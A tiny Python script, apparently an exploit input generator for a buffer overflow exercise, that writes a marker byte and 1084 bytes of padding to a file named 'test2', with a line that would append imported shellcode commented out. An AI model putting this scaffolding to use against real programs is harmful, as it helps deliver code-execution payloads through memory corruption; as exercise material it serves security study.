from shellcode import shellcode

with open("test2", 'w') as f:
    f.write(b'\xFF')
    f.write(b'\x01'*1084)
    #f.write(shellcode);
